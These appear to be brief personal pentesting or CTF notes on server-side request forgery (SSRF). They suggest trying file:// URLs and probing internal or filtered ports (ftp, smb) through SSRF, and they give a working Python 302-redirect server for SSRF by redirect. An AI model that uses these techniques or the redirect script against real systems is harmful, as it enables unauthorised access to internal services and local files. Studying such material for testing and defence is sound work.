Pay attention to also try "file:///home/", for example. It's not only "http://"  |
Actually, it would be more interesting if 'file://' works rather than 'http://'  |

If you find some ports open, like ftp, ldp, or smb, maybe you could try using here, if you don't have credentials.

If there is a filtered port, you can try connecting to it using SSRF

At first, try what you see in 'hacktricks' and 'payload all the things'

SSRF by redirect:
#!/usr/bin/python3
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
  def do_GET(self):
      self.send_response(302)
      self.send_header('Location', sys.argv[1])
      self.end_headers()

HTTPServer(("0.0.0.0", 80), Redirect).serve_forever()

Explained: HTTPServer (connection made, and response sent).keeping open
